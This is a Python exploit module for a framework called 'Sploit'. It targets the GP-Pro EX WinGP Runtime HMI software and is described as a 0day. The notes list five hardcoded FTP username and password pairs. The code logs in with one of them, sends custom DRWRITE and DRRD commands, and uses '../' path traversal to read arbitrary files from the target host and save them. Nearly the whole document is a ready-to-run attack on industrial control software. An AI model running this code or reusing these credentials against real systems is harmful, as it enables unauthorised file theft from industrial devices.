#!/usr/bin/env python

import socket
import struct

from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = 'efs_GP_PRO_EX_WinGP_Runtime_afd.py'
INFO['DESCRIPTION'] = 'GP-Pro EX HMI WinGP Runtime Arbitrary File Disclosure'
INFO['VENDOR'] = 'http://www.profaceamerica.com'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'http://www.profaceamerica.com/node/18226'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '23 Jun 2018'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """PCRuntime.exe contains ftp server with custom commands and contains hardcoded credentials.
Remote attacker can use hardcoded credentials to disclose arbitrary files less than 65535 bytes using '../' combination. 
Credentials are:

prsruntime:prsbackground
runtime:background
prsphoenix:prsforeground
prsproface:prscfcard
prsdigital:prscftool

and used by different subsystems of software.

Tested against WinGP Runtime 4.8.0 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '127.0.0.1'
OPTIONS['PORT'] = 21
OPTIONS['FILENAME'] = 'windows/win.ini'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.filename = self.args.get('FILENAME', OPTIONS['FILENAME'])

    def send(self, data):
        self.s.send(data + '\r\n')
        res = self.s.recv(1024)
        print repr(res)
        return res

    def get_port(self, data):
        code = data.split('(')[1].split(')')[0].split(',')[-2:]
        port = int(code[0]) * 256 + int(code[1])
        print port
        return port

    def recv_send_data(self, port, send=False, data='\xff\x00\xff\x00\x46\x45'):
        s1 = socket.socket()
        s1.connect((self.host, port))
        s1.settimeout(5)
        if send:
            s1.send(data)
        else:
            s1.recv(2)
            size_bytes = s1.recv(2)
            size = struct.unpack('<H', size_bytes)[0]
            chunk = 512
            buf = ''
            while size > 0:
                current_chunk = min(chunk, size)
                buf += s1.recv(current_chunk)
                size -= current_chunk
            if len(buf) < 10000:
                self.log('[+]\r\n' + buf)
            self.writefile(buf, self.filename.replace('\\', '/').split('/').pop())
        s1.close()

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Checking connection to %s:%s' % (self.host, self.port))
        self.s = socket.socket()
        self.s.connect((self.host, self.port))
        self.log('[*] Trying to read file %s' % self.filename)
        self.s.recv(1024)
        self.send('USER prsdigital')
        self.send('PASS prscftool')
        port = self.get_port(self.send('PASV'))
        self.send('DRWRITE 6 0 0')

        self.recv_send_data(port, True)
        self.s.recv(1024)

        port = self.get_port(self.send('PASV'))
        self.send('DRRD /NAND/../../../../../../../../../%s 0' % self.filename)
        self.recv_send_data(port)
        self.s.recv(1024)


        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()